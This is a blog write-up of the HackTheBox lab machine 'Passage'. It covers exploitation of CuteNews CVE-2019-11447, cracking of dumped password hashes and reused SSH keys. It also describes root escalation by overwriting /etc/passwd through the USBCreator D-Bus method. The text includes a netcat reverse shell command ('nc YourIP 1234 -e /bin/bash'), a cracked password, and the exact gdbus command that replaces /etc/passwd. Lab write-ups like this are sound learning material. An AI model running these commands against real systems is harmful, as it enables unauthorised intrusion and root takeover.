---
title: Hackthebox Passage Write-Up
tags: 
- hackthebox
- writeup
image: /images/pass/info.png
---

Whoa! Its that easy? Now either I am getting better with these boxes or it really was easy. I got to the 2nd user in about an hour of starting. The root part was a bit hard because the hints were very subtle. Even so things like dbus and misconfigured ssh  were new to me. This box felt like I was doing a speed run. Really good confidence booster too if I do say so myself. Anyway... less talking more rooting!

<!--more-->

<img src="/images/pass/info.png">

Nmap scan shows nothing new. As always its a SSH and web server(*why do I even bother?*). 

{%highlight text%}
Nmap scan report for 10.10.10.206
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{%endhighlight%}

Browsing to web page.

<img src="/images/pass/website.png" width="1000" />

Just clicking around I found a little clue at the end of the page.

<img src="/images/pass/cute.png" />

Powered by CuteNews. Sounds like a CVE to me. Some research lands me on a [exploit-db page](https://www.exploit-db.com/exploits/48800) for `CVE-2019-11447` with a full blown RCE. All I gotta do is give a URL to the tool and it will give me a shell. But doing just that is boring. Lets understand the exploit. [Follow Along!](https://www.exploit-db.com/exploits/48800)

- First we see a payload variable with what looks like a header for a image along with some php code to execute commands. This tells us that there is probably a image upload vulnerability where we can upload php code. 
- Next I notice that browsing to `CuteNews/cdata/users/lines` dumps all the credentials in base64 format. 
- Next we see that it is registering with random username with random password. When registered we can set a profile picturee and send the payload with php inside.
- Now that we have uploaded the php code all we have to do is provide a command and that command executes.

{%highlight text%}
python3 cute.py



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://10.10.10.206
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 5at0mf3bU0 and password: 5at0mf3bU0

=======================================================
Sending Payload
=======================================================
signature_key: e308dc5a62da8774eb77a4d151d0d456-5at0mf3bU0
signature_dsi: a90c0a071a7e6ff70eaa3fed9d2487e7
logged in user: 5at0mf3bU0
============================
Dropping to a SHELL
============================

command > nc YourIP 1234 -e /bin/bash
{%endhighlight%}

I use the tool to get a better netcat shell.

{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.10.206 57806 received!
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@passage:/var/www/html/CuteNews/uploads$ whoami
whoami
www-data
{%endhighlight%}

Next I try to crack the hashed passwords  we got from the tool with [Crackstation](https://crackstation.net). We get a hit.

<img src="/images/pass/crack.png" >

Browsing to home directory we see two users `Paul` and `nadav`. I try the password on paul and it worked.
{%highlight text%}
www-data@passage:/home$ su paul
su paul
Password: atlanta1

paul@passage:/home$ whoami
whoami
paul
paul@passage:/home$ id
id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
{%endhighlight%}

We have very limited privileges on the user paul. Meaning we will need the other user Nadav. I try many methods but no success. Next I thought Lets just get a better shell atleast. While I was getting the ssh keys from the home directory, I see nadav in the authorized keys file. Thats wierd. 

I thought maybe there is a ssh misconfiguration where some users share the same key. I logout of paul and try logging in nadav from the same keys and bingo! we are now the user Nadav with so much better privileges. To be honest I forgot to take a screenshot of the groups and stuff so that one is my bad. I'll treat you to some pizza later. 

Even with higher privileges I was yet to find anything worth-while. I had to head on over to HTB forum and someone says that all I need is the home directory. I begin digging like a maniac and search each and every suspicious keyword I find inside the files.

I find a file named `.viminfo` with the contents like:

{%highlight text%}
# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	"	12	7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	"	2	0
	.	2	0
	+	2	0
{%endhighlight%}

oohhh... that looks important. I knew about dbus but what I did not know about was any exploit related to it. I do some digging and stumble across this [awesome article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/). I mean it gives you each and every detail about Dbus and its exploit. You know what I am gonna go and read it again.

I just saw that the article was written by "Nadav" Markus. Nice one Hackthebox. So I go ahead and read the whole thing. Here is what I understand:

Dbus is used for inter-process communication. Meaning to pass data between different processes. There is a dbus service known as USB creator which has a method known as Image. The vulnerability is that this method allows all the users in the sudo group( which we are) to copy and paste files between different locations even if it is present inside the root directory and that too without authentication. 

The lazy way to exploit this would be to just copy the root.txt flag and paste it somewhere you can read it. But that is not my way. I want to fully comprimise this thing. I remember a technique I saw from John Hammond's youtube videos where you can change the password of the root user.

I always wanted to try it and I finally have the chance. Here is how you do it. 

- First print out the contents of the /etc/passwd file.
- copy it and save it inside a file. Next generate the hash of the password you want to set for the root user. Like this:
{%highlight text%}
echo 'joske' | openssl passwd -1 -stdin
$1$xY5ZsdUc$rpmwo9tgdY7j8JAPSxmgy/
{%endhighlight%}
Replace "joske" with any password you want.

- Next copy the hash and put it in place of the "x" that is beside the root user in the passwd file. Like this

Before
{%highlight text%}
root:x:0:0:root:/root:/bin/bash
{%endhighlight%}

After
{%highlight text%}
root:$1$xY5ZsdUc$rpmwo9tgdY7j8JAPSxmgy/:0:0:root:/root:/bin/bash
{%endhighlight%}

- Now that your new passwd file is ready just go ahead and use the command used in the article. This is what I did.

{%highlight text%}
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd /etc/passwd true
{%endhighlight%}

The first file is where your new file is located and the second file is the one you want to overwrite.
- Try changing the user to root using the password you chose before.

{%highlight text%}
nadav@passage:~$ su root
Password: 
root@passage:/home/nadav#
root@passage:/# whoami
root
root@passage:/# id
uid=0(root) gid=0(root) groups=0(root)
{%endhighlight%}

When this worked I screamed like a girl. Oh the dopamine rush when something like this works :)

All in all a really fun box. Took me just an evening to root this one. At this point I have completed all the easy boxes and only 2-3 of the medium ones are left. After which I look forward to the the hardcore hacking. Till then... Sayonara!